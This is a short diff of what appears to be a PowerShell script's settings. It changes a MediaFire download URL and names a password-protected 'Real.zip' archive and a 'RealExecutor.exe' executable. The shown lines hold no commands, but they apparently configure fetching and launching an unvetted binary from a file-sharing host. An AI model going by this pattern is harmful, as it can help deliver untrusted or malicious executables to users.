@@ -2,7 +2,7 @@
 # 1. Variables
 # ==============================
 
-$mediaFireUrl = "https://www.mediafire.com/file/wltynfgeenqtl2e/"
+$mediaFireUrl = "https://www.mediafire.com/file/f0rj0qxla4y354c/"
 #$password      = "lunaexecutor"
 $zipName       = "Real.zip"
 $exeName       = "RealExecutor.exe"
